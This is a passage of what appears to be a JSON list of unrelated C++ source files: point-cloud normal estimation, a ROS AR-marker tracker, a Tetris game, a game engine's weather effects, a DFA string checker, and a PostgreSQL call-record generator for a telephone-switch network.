pcl::search::KdTree<pcl::PointXYZ>());\n\tne.setSearchMethod(tree);\n\n\t// Output datasets\n\tpcl::PointCloud<pcl::Normal>::Ptr cloud_normals(new pcl::PointCloud<pcl::Normal>);\n\n\t// Compute the features\n\tne.compute(*cloud_normals);\n\n\t// Use all neighbors in a sphere of radius 3cm\n\tne.setRadiusSearch(0.03);\n\n\n\tpcl::visualization::CloudViewer viewer(\"cloud viewer\");\n\n\tviewer.showCloud(cloud);\n\tviewer.runOnVisualizationThreadOnce(viewerOneOff);\n\n\twhile (!viewer.wasStopped())\n\t{\n\n\t}\n\tsystem(\"pause\");\n\treturn 0;\n}",
    "/*\n  Software License Agreement (BSD License)\n\n  Copyright (c) 2012, Scott Niekum\n  All rights reserved.\n\n  Redistribution and use in source and binary forms, with or without\n  modification, are permitted provided that the following conditions\n  are met:\n\n  * Redistributions of source code must retain the above copyright\n  notice, this list of conditions and the following disclaimer.\n  * Redistributions in binary form must reproduce the above\n  copyright notice, this list of conditions and the following\n  disclaimer in the documentation and/or other materials provided\n  with the distribution.\n  * Neither the name of the Willow Garage nor the names of its\n  contributors may be used to endorse or promote products derived\n  from this software without specific prior written permission.\n\n  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n  \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n  FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n  INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n  BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n  POSSIBILITY OF SUCH DAMAGE.\n\n  author: Scott Niekum\n*/\n#include \"ar_track_alvar/MarkerDetector.h\"\n#include \"ar_track_alvar/MultiMarkerBundle.h\"\n#include \"ar_track_alvar/MultiMarkerInitializer.h\"\n#include <cv_bridge/cv_bridge.h>\n#include <ar_track_alvar_msgs/AlvarMarker.h>\n#include <ar_track_alvar_msgs/AlvarMarkers.h>\n#include <tf/transform_listener.h>\n#include <tf/transform_broadcaster.h>\n#include <std_msgs/Bool.h>\n\n#include <sensor_msgs/PointCloud2.h>\n#include <pcl_conversions/pcl_conversions.h>\n#include <pcl/point_types.h>\n\n#include <geometry_msgs/PoseStamped.h>\n#include <sensor_msgs/image_encodings.h>\n#include <ros/ros.h>\n#include <pcl/segmentation/sac_segmentation.h>\n\n#include <tf/tf.h>\n#include <Eigen/Core>\n#include <utility>\n#include <ar_track_alvar/filter/kinect_filtering.h>\n#include <ar_track_alvar/filter/medianFilter.h>\n#include <dynamic_reconfigure/server.h>\n#include <ar_track_alvar/ParamsConfig.h>\n\n#define MAIN_MARKER 1\n#define VISIBLE_MARKER 2\n#define GHOST_MARKER 3\n\nnamespace gm = geometry_msgs;\nnamespace ata = ar_track_alvar;\n\ntypedef pcl::PointXYZRGB ARPoint;\ntypedef pcl::PointCloud<ARPoint> ARCloud;\n\nusing namespace alvar;\nusing namespace std;\nusing boost::make_shared;\n\nCamera* cam;\ncv_bridge::CvImagePtr cv_ptr_;\nimage_transport::Subscriber cam_sub_;\nros::Subscriber cloud_sub_;\nros::Publisher arMarkerPub_;\nros::Publisher rvizMarkerPub_;\nros::Publisher rvizMarkerPub2_;\nar_track_alvar_msgs::AlvarMarkers arPoseMarkers_;\ntf::TransformListener* tf_listener;\ntf::TransformBroadcaster* tf_broadcaster;\nMarkerDetector<MarkerData> marker_detector;\nMultiMarkerBundle** multi_marker_bundles = nullptr;\n\nPose* bundlePoses;\nint* master_id;\nint* bundles_seen;\nbool* master_visible;\nstd::vector<int>* bundle_indices;\nbool init = true;\nata::MedianFilter** med_filts;\nint med_filt_size;\n\nbool enable_switched = false;\nbool enabled = true;\ndouble marker_size;\ndouble max_new_marker_error;\ndouble max_track_error;\nstd::string cam_image_topic;\nstd::string cam_info_topic;\nstd::string output_frame;\ndouble max_frequency = 8.0;  // default maximum frequency\nint marker_resolution = 5;   // default marker resolution\nint marker_margin = 2;       // default marker margin\nint n_bundles = 0;\n\n// Debugging utility function\nvoid draw3dPoints(const ARCloud::Ptr& cloud, const string& frame, int color,\n                  int id, double rad)\n{\n  visualization_msgs::Marker rvizMarker;\n\n  rvizMarker.header.frame_id = frame;\n  rvizMarker.header.stamp = ros::Time::now();\n  rvizMarker.id = id;\n  rvizMarker.ns = \"3dpts\";\n\n  rvizMarker.scale.x = rad;\n  rvizMarker.scale.y = rad;\n  rvizMarker.scale.z = rad;\n\n  rvizMarker.type = visualization_msgs::Marker::SPHERE_LIST;\n  rvizMarker.action = visualization_msgs::Marker::ADD;\n\n  if (color == 1)\n  {\n    rvizMarker.color.r = 0.0f;\n    rvizMarker.color.g = 1.0f;\n    rvizMarker.color.b = 1.0f;\n    rvizMarker.color.a = 1.0;\n  }\n  if (color == 2)\n  {\n    rvizMarker.color.r = 1.0f;\n    rvizMarker.color.g = 0.0f;\n    rvizMarker.color.b = 1.0f;\n    rvizMarker.color.a = 1.0;\n  }\n  if (color == 3)\n  {\n    rvizMarker.color.r = 1.0f;\n    rvizMarker.color.g = 1.0f;\n    rvizMarker.color.b = 0.0f;\n    rvizMarker.color.a = 1.0;\n  }\n\n  gm::Point p;\n  for (auto& point : cloud->points)\n  {\n    p.x = point.x;\n    p.y = point.y;\n    p.z = point.z;\n    rvizMarker.points.push_back(p);\n  }\n\n  rvizMarker.lifetime = ros::Duration(1.0);\n  rvizMarkerPub2_.publish(rvizMarker);\n}\n\nvoid drawArrow(const gm::Point& sta",
    "#include \"Tetris.h\"\n#include <time.h>\n#include <stdlib.h>\n#include <conio.h> //\u63a7\u5236\u53f0\u7684io\u8f93\u5165\u8f93\u51fa,\u952e\u76d8\n#include <iostream>\n#include <fstream>\n#include \"Block.h\"\n#include <mmsystem.h>\n#pragma comment(lib,\"winmm.lib\")\n\n#define MAX_LEVEL 5\n#define RECORDER_FILE \"recorder.txt\"\n\n//const int SPEED_NORMAL = 500; //ms\nconst int SPEED_NORMAL[MAX_LEVEL] = { 500,400,300,200,100 };\nconst int SPEED_QUICK = 50;\n\nTetris::Tetris(int rows, int cols, int left, int top, int blockSize)\n{\n\tthis->rows = rows;\n\tthis->cols = cols;\n\tthis->leftMargin = left;\n\tthis->topMargin = top;\n\tthis->blockSize = blockSize;\n\n\tfor (int i = 0;i < rows;i++)\n\t{\n\t\tvector<int> mapRow;\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tmapRow.push_back(0);\n\t\t}\n\t\tmap.push_back(mapRow);\n\t}\n}\n\nvoid Tetris::init()\n{\n\tmciSendString(\"play res/bg.mp3 repeat\", 0, 0, 0);\n\t\n\tdelay = SPEED_NORMAL[0];\n\n\t//\u914d\u7f6e\u968f\u673a\u79cd\u5b50\n\tsrand(time(NULL));\n\n\t//\u521b\u5efa\u6e38\u620f\u7a97\u53e3\n\tinitgraph(938, 896);\n\n\t//\u52a0\u8f7d\u80cc\u666f\u56fe\u7247\n\tloadimage(&imgBg, \"res/bg2.png\");\n\n\tloadimage(&imgWin, \"res/win.png\");\n\tloadimage(&imgOver, \"res/over.png\");\n\n\t//\u521d\u59cb\u5316\u6e38\u620f\u533a\u4e2d\u7684\u6570\u636e\n\tchar data[20][10];\n\tfor (int i = 0;i < rows;i++)\n\t{\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tmap[i][j] = 0;\n\t\t}\n\t}\n\n\tscore = 0;\n\tlineCount = 0;\n\tlevel = 1;\n\n\t//\u521d\u59cb\u5316\u6700\u9ad8\u5206\n\tifstream file(RECORDER_FILE);\n\tif (!file.is_open())\n\t{\n\t\tcout << RECORDER_FILE << \"\u6253\u5f00\u5931\u8d25\" << endl;\n\t\thighestScore = 0;\n\t}\n\telse\n\t{\n\t\tfile >> highestScore;\n\t}\n\tfile.close(); //\u5173\u95ed\u6587\u4ef6\n\n\tgameOver = false;\n}\n\nvoid Tetris::play()\n{\n\tinit();\n\n\tnextBlock = new Block;\n\tcurBlock = nextBlock;\n\tnextBlock = new Block;\n\n\tint timer = 0;\n\twhile (1)\n\t{\n\t\t//\u63a5\u53d7\u7528\u6237\u7684\u8f93\u5165\n\t\tkeyEvent();\n\t\ttimer += getDelay();\n\t\tif (timer > delay)\n\t\t{\n\t\t\ttimer = 0;\n\t\t\tdrop();\n\t\t\t//\u6e32\u67d3\u6e38\u620f\u753b\u9762\n\t\t\tupdate = true;\n\t\t}\n\n\t\tif (update)\n\t\t{\n\t\t\tupdate = false;\n\t\t\t//\u66f4\u65b0\u6e38\u620f\u7684\u753b\u9762\n\t\t\tupdateWindow();\n\t\t\t\n\t\t\t//\u66f4\u6539\u6e38\u620f\u6570\u636e\n\t\t\tclearLine();\n\t\t}\n\n\t\tif (gameOver)\n\t\t{\n\t\t\t//\u4fdd\u5b58\u5206\u6570\n\t\t\tsaveScore();\n\t\t\t//\u66f4\u65b0\u6e38\u620f\u7ed3\u675f\u754c\u9762\n\t\t\tdisplayOver();\n\n\t\t\tsystem(\"pause\");\n\t\t\tinit(); //\u91cd\u65b0\u5f00\u5c40\n\t\t}\n\t}\n}\n\nvoid Tetris::keyEvent()\n{\n\tunsigned char ch; //\u6709\u7b26\u53f7\u8303\u56f4\uff1a-128,127\n\tbool rotateFlag = false;\n\tint dx = 0;\n\tif (_kbhit()) //\u6309\u952e\u8f93\u5165\n\t{\n\t\tch = _getch();\n\n\t\t//\u5982\u679c\u6309\u4e0b\u65b9\u5411\u952e\uff0c\u4f1a\u81ea\u52a8\u8fd4\u56de\u4e24\u4e2a\u5b57\u7b26\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u4e0a\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 72\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u4e0b\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 80\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u5de6\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 75\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u53f3\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 77\n\t\tif (ch == 224)\n\t\t{\n\t\t\tch = _getch();\n\t\t\tswitch (ch)\n\t\t\t{\n\t\t\tcase 72:\n\t\t\t\trotateFlag = true;\n\t\t\t\tbreak;\n\t\t\tcase 80:\n\t\t\t\tdelay = SPEED_QUICK;\n\t\t\t\tbreak;\n\t\t\tcase 75:\n\t\t\t\tdx = -1;\n\t\t\t\tbreak;\n\t\t\tcase 77:\n\t\t\t\tdx = 1;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (rotateFlag)\n\t{\n\t\trotate();\n\t\tupdate = true;\n\t}\n\n\tif (dx != 0)\n\t{\n\t\tmoveLeftRight(dx);\n\t\tupdate = true;\n\t}\n}\n\nvoid Tetris::updateWindow()\n{\n\tIMAGE** imgs = Block::getImages();\n\tBeginBatchDraw(); //\u9632\u6b62\u95ea\u70c1\n\n\tputimage(0, 0, &imgBg);  //\u7ed8\u5236\u80cc\u666f\u56fe\u7247\n\n\tfor (int i = 0;i < rows;i++)\n\t{\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tif (map[i][j] == 0)\n\t\t\t\tcontinue;\n\t\t\tint x = j * blockSize + leftMargin;\n\t\t\tint y = i * blockSize + topMargin;\n\t\t\tputimage(x, y, imgs[map[i][j] - 1]);\n\t\t}\n\t}\n\n\tcurBlock->draw(leftMargin, topMargin);\n\tnextBlock->draw(689, 150);\n\n\tdrawScore();  //\u7ed8\u5236\u5206\u6570\n\n\tEndBatchDraw();\n}\n\n//\u7b2c\u4e00\u6b21\u8c03\u7528\uff0c\u8fd4\u56de0\n//\u8fd4\u56de\u8ddd\u79bb\u4e0a\u4e00\u6b21\u8c03\u7528\u95f4\u9694\nint Tetris::getDelay()\n{\n\tstatic unsigned long long lastTime = 0;\n\tunsigned long long currentTime = GetTickCount();\n\n\tif (lastTime == 0)\n\t{\n\t\tlastTime = currentTime;\n\t\treturn 0;\n\t}\n\telse\n\t{\n\t\tint ret = currentTime - lastTime;\n\t\tlastTime = currentTime;\n\t\treturn ret;\n\t}\n}\n\nvoid Tetris::drop()\n{\n\tbakBlock = *curBlock;\n\tcurBlock->drop();\n\n\tif (curBlock->blockInMap(map) == false)\n\t{\n\t\tdelay = SPEED_NORMAL[level-1]; //\u5230\u5e95\u540e\u901f\u5ea6\u53d8\u56de\u5e38\u89c4\n\t\t//\u628a\u8fd9\u4e2a\u65b9\u5757\u56fa\u5316\n\t\tbakBlock.solidify(map);\n\t\tdelete curBlock;\n\t\tcurBlock = nextBlock;\n\t\tnextBlock = new Block;\n\n\t\t//\u68c0\u67e5\u6e38\u620f\u662f\u5426\u7ed3\u675f\n\t\tcheckOver();\n\t}\n}\n\nvoid Tetris::clearLine()\n{\n\tint lines = 0;\n\tint k = rows - 1; //\u5b58\u50a8\u6570\u636e\u7684\u884c\u6570\n\tfor (int i = rows - 1;i >= 0;i--)\n\t{\n\t\tint count = 0;\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tif (map[i][j])\n\t\t\t{\n\t\t\t\tcount++;\n\t\t\t}\n\t\t\tmap[k][j] = map[i][j]; //\u5148\u5b58\u4e0b\uff0c\u5982\u679c\u8981\u6d88\u9664\uff0c\u63a5\u7740\u672c\u884c\u5b58\u50a8\n\t\t}\n\t\tif(count < cols) //\u5982\u679c\u4e0d\u7528\u6d88\u9664\uff0c\u5219\u5b58\u4e0a\u4e00\u884c\n\t\t{\n\t\t\tk--;\n\t\t}\n\t\telse //\u6d88\u9664\uff0ck\u4e0d\u52a8\u4e0b\u6b21\u63a5\u7740\u5b58\u672c\u884c\n\t\t{\n\t\t\tlines++;\n\t\t}\n\t}\n\tif (lines > 0)\n\t{\n\t\t//\u8ba1\u7b97\u5f97\u5206\n\t\tint addScore[4] = { 10,30,60,80 };\n\t\tscore += addScore[lines - 1];\n\n\t\tmciSendString(\"play res/xiaochu1.mp3\", 0, 0, 0);\n\t\tupdate = true;\n\n\t\t//\u6bcf100\u5206\u4e00\u4e2a\u7ea7\u522b 0-100 \u7b2c\u4e00\u5173 101-200\u7b2c\u4e8c\u5173\n\t\tlevel = (score + 99) / 100;\n\t\tif (level > MAX_LEVEL)\n\t\t{\n\t\t\tgameOver = true;\n\t\t}\n\n\t\tlineCount += lines;\n\t}\n}\n\nvoid Tetris::moveLeftRight(int offset)\n{\n\tbakBlock = *curBlock;\n\tcurBlock->moveLeftRight(offset);\n\n\tif (!curBlock->blockInMap(map))\n\t{\n\t\t*curBlock = bakBlock;\n\t}\n}\n\nvoid Tetris::rotate()\n{\n\tif (curBlock->getBlockType() == 7) return;\n\n\tbakBlock = *curBlock;\n\tcurBlock->rotate();\n\n\tif (!curBlock->blockInMap(map))\n\t{\n\t\t*curBlock = bakBlock;\n\t}\n}\n\nvoid Tetris::drawScore()\n{\n\tchar scoreText[32];\n\tsprintf_s(scoreText, sizeof(scoreText), \"%d\", score);\n\n\tsetcolor(RGB(180, 180, 180));\n\n\tLOGFONT f;\n\tgettextstyle(&f);  //\u83b7\u53d6\u5f53\u524d\u7684\u5b57\u4f53\n\tf.lfHeight = 60;\n\tf.lfWeight = 30;\n\tf.lfQuality = ANTIALIASED_QUALITY; //\u8bbe\u7f6e\u5b57\u4f53\u4e3a\u201c\u6297\u952f\u9f7f\u201d\u6548\u679c\n\tstrcpy_s(f.lfFaceName, sizeof(f.lfFaceName), _T(\"Segoe UI Black\"));\n\tsettextstyle(&f);\n\n\tsetbkmode(TRANSPARENT); //\u5b57\u4f53\u7684\u80cc\u666f",
    "// N3GlobalEffectMng.cpp: implementation of the CN3GlobalEffectMng class.\n//\n//////////////////////////////////////////////////////////////////////\n#include \"stdafx.h\"\n#include \"N3GlobalEffectMng.h\"\n#include \"N3GERain.h\"\n#include \"N3GESnow.h\"\n\nCN3GlobalEffectMng::CN3GlobalEffectMng()\n{\n\tm_pGERain = NULL;\n\tm_pGESnow = NULL;\n\tCN3GlobalEffectMng::Release();\n}\n\nCN3GlobalEffectMng::~CN3GlobalEffectMng()\n{\n\tCN3GlobalEffectMng::Release();\n}\n\nvoid CN3GlobalEffectMng::Release()\n{\n\tCN3Base::Release();\n\tm_fCellSize = 0.0f;\n\tm_CurCellPos.x = m_CurCellPos.y = -1;\n\n\tif (m_pGERain) {delete m_pGERain; m_pGERain = NULL;}\n\tif (m_pGESnow) {delete m_pGESnow; m_pGESnow = NULL;}\n}\n\nvoid CN3GlobalEffectMng::Tick()\n{\n\tif (m_fCellSize<=0.0f) return;\n\n\tPOINT NewCellPos;\t\n\tNewCellPos.x = int(s_CameraData.vEye.x/m_fCellSize);\n\tNewCellPos.y = int(s_CameraData.vEye.z/m_fCellSize);\n\tif (NewCellPos.x != m_CurCellPos.x || NewCellPos.y != m_CurCellPos.y)\n\t{\n\t\tm_CurCellPos = NewCellPos;\n\t\tint i, j;\n\t\tfor(i=0; i<3; ++i)\n\t\t\tfor(j=0; j<3; ++j)\n\t\t\t\tm_vPos[j*3+i].Set( (m_CurCellPos.x+i-0.5f)*m_fCellSize, 0, (m_CurCellPos.y+j-0.5f)*m_fCellSize);\n\t}\n\n\tif (m_pGERain)\n\t{\n\t\tm_pGERain->Tick();\n\t\tif(m_pGERain->NeedDelete()) { delete m_pGERain; m_pGERain = NULL; }\n\t}\n\tif (m_pGESnow)\n\t{\n\t\tm_pGESnow->Tick();\n\t\tif(m_pGESnow->NeedDelete()) { delete m_pGESnow; m_pGESnow = NULL; }\n\t}\n\n}\n\nvoid CN3GlobalEffectMng::Render()\n{\n\tint i, j;\n\tfor (i=0; i<3; ++i)\n\t{\n\t\tfor(j=0; j<3; ++j)\n\t\t{\n\t\t\tif (m_pGERain)\n\t\t\t{\n\t\t\t\tm_pGERain->Render(m_vPos[j*3+i]);\n\t\t\t}\n\t\t\tif (m_pGESnow)\n\t\t\t{\n\t\t\t\tm_pGESnow->Render(m_vPos[j*3+i]);\n\t\t\t}\n\t\t}\n\t}\n}\n/*\nvoid CN3GlobalEffectMng::SetWeather(int iWeather)\n{\n\tconst float fHeight = 20.0f;\n\tBOOL\tbRainy;\n\tfloat fDensity;\n\t__Vector3 vVelocity;\n\tfloat fRainLength;\n\tfloat fSnowSize;\n\n\tswitch(iWeather)\n\t{\n\tcase GEW_CLEAR:\n\t\tif (m_pGERain) m_pGERain->FadeSet(3.0f, false);\n\t\tif (m_pGESnow) m_pGESnow->FadeSet(3.0f, false);\n\t\treturn;\n\t\tbreak;\n\tcase GEW_DRIZZLE_RAIN:\n\t\tbRainy = TRUE;\n\t\tfDensity = 0.03f;\n\t\tvVelocity.Set(0.3f, -7.0f, 0);\n\t\tfRainLength = 0.1f;\n\t\tbreak;\n\tcase GEW_RAINY:\n\t\tbRainy = TRUE;\n\t\tfDensity = 0.08f;\n\t\tvVelocity.Set(0, -10.0f, 1);\n\t\tfRainLength= 0.2f;\n\t\tbreak;\n\tcase GEW_HEAVY_RAIN:\n\t\tbRainy = TRUE;\n\t\tfDensity = 0.12f;\n\t\tvVelocity.Set(0.3f, -10.0f, -1.5f);\n\t\tfRainLength= 0.25f;\n\t\tbreak;\n\tcase GEW_SNOW1:\n\t\tbRainy = FALSE;\n\t\tfDensity = 0.08f;\n\t\tvVelocity.Set(0.0f, -0.7f, 0.0f);\n\t\tfSnowSize = 0.05f;\n\t\tbreak;\n\tcase GEW_SNOW2:\n\t\tbRainy = FALSE;\n\t\tfDensity = 0.12f;\n\t\tvVelocity.Set(0.5f, -1.0f, 0.0f);\n\t\tfSnowSize = 0.08f;\n\t\tbreak;\n\tcase GEW_HEAVY_SNOW:\n\t\tbRainy = FALSE;\n\t\tfDensity = 0.2f;\n\t\tvVelocity.Set(-9.0f, -3.0f, 0.0f);\n\t\tfSnowSize = 0.1f;\n\t\tbreak;\n\tdefault:\n\t\treturn;\n\t}\n\t\n\tif (bRainy)\n\t{\n\t\tif (m_pGERain == NULL) m_pGERain = new CN3GERain;\n\n\t\tm_fCellSize = 20.0f;\n\t\tm_pGERain->Create(fDensity, m_fCellSize, fHeight, fRainLength, vVelocity);\t// \ube44\n\t\tm_pGERain->SetActive(TRUE);\n\t\tif (m_pGESnow) m_pGESnow->FadeSet(3.0f, false);\n\t}\n\telse\n\t{\n\t\tif (m_pGESnow == NULL) m_pGESnow = new CN3GESnow;\n\n\t\tm_fCellSize = 10.0f;\n\t\tm_pGESnow->Create(fDensity, m_fCellSize, fHeight, fSnowSize, vVelocity);\t// \ub208\n\t\tm_pGESnow->SetActive(TRUE);\n\t\tif (m_pGERain) m_pGERain->FadeSet(3.0f, false);\n\t}\n}\n*/\nvoid CN3GlobalEffectMng::WeatherSetClean()\n{\n\tif (m_pGESnow) m_pGESnow->FadeSet(3.0f, false);\n\tif (m_pGERain) m_pGERain->FadeSet(3.0f, false);\n}\n\nvoid CN3GlobalEffectMng::WeatherSetRainy(int iPercent)\n{\n\tif (m_pGESnow) m_pGESnow->FadeSet(3.0f, false);\n\tif (m_pGERain == NULL) m_pGERain = new CN3GERain;\n\n\tfloat fHeight = 20.0f;\n\tfloat fPercent = iPercent / 100.0f;\n\tfloat fDensity = fPercent * 0.1f;\n\t__Vector3 vVelocity(3.0f * ((50-rand()%100) / 50.0f), -(10.0f + 8.0f * fPercent), 0);\n\tfloat fRainLength = 0.4f + 0.6f * fPercent;\n\n\tm_fCellSize = 20.0f;\n\tm_pGERain->Create(fDensity, m_fCellSize, fHeight, fRainLength, vVelocity, 10.0f);\t// \ube44\n\tm_pGERain->SetActive(TRUE);\n}\n\nvoid CN3GlobalEffectMng::WeatherSetSnow(int iPercent)\n{\n\tif (m_pGERain) m_pGERain->FadeSet(3.0f, false);\n\tif (m_pGESnow == NULL) m_pGESnow = new CN3GESnow;\n\n\tfloat fHeight = 20.0f;\n\tfloat fPercent = iPercent / 100.0f;\n\tfloat fDensity = fPercent * 0.1f;\n\tfloat fHorz = (3.0f * fPercent) + (3.0f * ((50-rand()%100) / 50.0f));\n\t__Vector3 vVelocity(fHorz, -(2.0f + 2.0f * fPercent), 0);\n\tfloat fSnowSize = 0.1f + 0.1f * fPercent;\n\n\tm_fCellSize = 20.0f;\n\tm_pGESnow->Create(fDensity, m_fCellSize, fHeight, fSnowSize, vVelocity, 10.0f);\t// \ube44\n\tm_pGESnow->SetActive(TRUE);\n}",
    "#include <iostream>\nusing namespace std;\nint currentState = 0;\nint prevState= 0;\nbool isAccepted(string);\nint main(){\n\tstring input;\n\tcout<<\"Enter any string of 0 and 1 : \"<<endl;\n\tcin>>input;\n \n    if (isAccepted(input)) {\n        \n        cout<<\"STRING ACCEPTED\"; \n    }\n    else{\n         cout<<\"STRING NOT ACCEPTED\"; \n    }\n    return 0; \n}\nvoid checkq0(char c){\n    if(c=='1'){\n        currentState = 1;\n    }\n    else if(c=='0'){\n        currentState = 0;\n    }\n    \n    cout<<\"Move(\"<<prevState<<\",\"<<c<<\")=\"<<currentState<<endl;\n    prevState = currentState;\n}\nvoid checkq1(char c){\n    if(c=='1'){\n        currentState = 2;\n    }\n    else if(c=='0'){\n        currentState = 0;\n    }\n\n    cout<<\"Move(\"<<prevState<<\",\"<<c<<\")=\"<<currentState<<endl;\n    prevState = currentState;\n}\nvoid checkq2(char c){\n    if(c=='0') {\n        currentState = 0;\n    }\n    else if(c=='1'){\n        currentState = 2;\n    }\n    cout<<\"Move(\"<<prevState<<\",\"<<c<<\")=\"<<currentState<<endl;\n    prevState = currentState;\n}\nbool isAccepted(string str)\n{\n    int i, len = str.length();\n\n    for (i = 0; i < len; i++) {\n        if (currentState == 0)\n            checkq0(str[i]);\n\n        else if (currentState == 1)\n            checkq1(str[i]);\n\n        else if (currentState == 2)\n            checkq2(str[i]);\n               \n        else\n            return 0;\n    }\n    \n    if (currentState == 2)\n        return 1;\n    else\n        return 0;\n}\n\n\n",
    "#include <string>\n#include <iostream>\n#include <exception>\n#include \"structs_and_consts.h\"\n\n#include <Poco/Data/PostgreSQL/Connector.h>\n#include <Poco/Data/PostgreSQL/PostgreSQLException.h>\n\n#include <Poco/Data/SessionFactory.h>\n#include <Poco/Data/RecordSet.h>\n\nusing namespace std;\n\n\nvoid get_graph_info(vector<vector<int>> &g_list, vector<vector<pair<int, int>>> &g_graph, \n                    vector<vector<int64_t>> &min_dist, Poco::Data::Session& session){\n    switch_info cur;                    \n    Poco::Data::Statement select_graph_info(session);\n    select_graph_info << \"SELECT id_switch, id_out_trunk, id_remote_trunk_in, \"\n                      << \"id_remote_switch, time_zone, distance FROM Switches\",\n                      Poco::Data::Keywords::into(cur.id),\n                      Poco::Data::Keywords::into(cur.id_out_tr),\n                      Poco::Data::Keywords::into(cur.id_rem_in_tr),\n                      Poco::Data::Keywords::into(cur.id_rem_sw),\n                      Poco::Data::Keywords::into(cur.tm_zone),\n                      Poco::Data::Keywords::into(cur.distance),\n                      Poco::Data::Keywords::range(0, 1);\n\n    while (!select_graph_info.done()) {\n        if(select_graph_info.execute()){\n            g_list[cur.id].push_back(cur.id_rem_sw);\n            g_graph[cur.id][cur.id_rem_sw] = {cur.id_out_tr, cur.id_rem_in_tr};\n            min_dist[cur.id][cur.id_rem_sw] = cur.distance;\n        }\n    }\n}\n\nvoid floyd_warshell(vector<vector<int64_t>>& g, vector<vector<int>>& p) {\n\tint n = g.size();\n\tfor (int k = 0;k < n;k++) {\n\t\tfor (int u = 0;u < n;u++) {\n\t\t\tfor (int v = 0;v < n;v++) {\n\t\t\t\tif (g[u][v] > g[u][k] + g[k][v]) {\n\t\t\t\t\tg[u][v] = g[u][k] + g[k][v];\n\t\t\t\t\tp[u][v] = k;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\nvector<int> find_path(int u, int v, const vector<vector<int>> &p) {\n\tif (p[u][v] == -1) {\n\t\treturn { u, v };\n\t}\n\tvector<int> v1 = find_path(u, p[u][v], p);\n\tvector<int> v2 = find_path(p[u][v], v, p);\n\tv1.pop_back();\n    int n = v2.size();\n\tfor (int i = 0;i < n;i++) {\n\t\tv1.push_back(v2[i]);\n\t}\n\treturn v1;\n}\n\nvoid generate_calls(vector<pair<cdr_info, int>> &reqs, vector<int> &start_points, vector<int> &end_points){\n    int size_of_st = start_points.size();\n    int size_of_end = end_points.size();\n    for(int i = 0; i < n_calls; i++){\n        pair<cdr_info, int> cur;\n        cur.first.cur_time = un_tm_stmp_delay + rand() % time_upper_bound;\n        cur.first.duration = rand() % max_dur_call;\n        cur.first.from = \"8\";\n        cur.first.to = \"8\";\n        for(int j = 0; j < 10; j++){\n            char tmp1 = rand() % 10 + '0';\n            char tmp2 = rand() % 10 + '0';\n            cur.first.from = cur.first.from + tmp1;\n            cur.first.to = cur.first.to + tmp2;\n        }\n        int id1 = rand() % size_of_st;\n        cur.first.id_sw = start_points[id1];\n        cur.first.is_start = true;\n        int id2 = rand() % size_of_end;\n        cur.second = end_points[id2];\n        if(cur.first.id_sw == cur.second){                                    // \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0439 \u0438 \u0438\u0441\u0445\u043e\u0434\u044f\u0449\u0438\u0439 \u0430\u0431\u043e\u043d\u0435\u043d\u0442 \u0441\u043e\u0432\u043f\u0430\u043b\u0438\n            if(size_of_st == 1){\n                id2 = (id2 + 1) % size_of_end;\n                cur.second = end_points[id2];\n            } else {\n                id1 = (id1 + 1) % size_of_st;\n                cur.first.id_sw = start_points[id1];\n            }\n        }\n        reqs.push_back(cur);\n    }\n}\n\nint find_gmt(int a, Poco::Data::Session& session){\n    int res;\n\n    Poco::Data::Statement select_gmt(session);\n    select_gmt << \"SELECT time_zone FROM Switches WHERE id_switch = $1\\n\",\n    Poco::Data::Keywords::use(a),\n    Poco::Data::Keywords::into(res);\n    select_gmt << \"LIMIT 1\";\n    select_gmt.execute();\n\n    return res;\n}\n\nvoid generate_info(Poco::Data::Session& session){\n    srand(time(0));\n\n    cout << \"creating tables\\n\";\n\n    Poco::Data::Statement delete_stmt1(session);\n    delete_stmt1 << \"DROP TABLE IF EXISTS Switches\";\n    delete_stmt1.execute();\n\n    Poco::Data::Statement delete_stmt2(session);\n    delete_stmt2 << \"DROP TABLE IF EXISTS CDRs\";\n    delete_stmt2.execute();\n\n    Poco::Data::Statement create_stmt1(session);\n\n    create_stmt1 << \"CREATE TABLE Switches\"\n                 << \"(\"\n                 << \"id INT NOT NULL,\"\n                 << \"id_switch INT NOT NULL,\"                          // \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u044b\u0439 \u043a\u043e\u043c\u043c\u0443\u0442\u0430\u0442\u043e\u0440\n                 << \"id_out_trunk INT NOT NULL,\"                       // \u0438\u0441\u0445\u043e\u0434\u044f\u0449\u0438\u0439 \u043e\u0442 \u043d\u0430\u0441 \u0442\u0440\u0430\u043d\u043a\n                 << \"id_remote_trunk_in INT NOT NULL,\"                 // \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0439 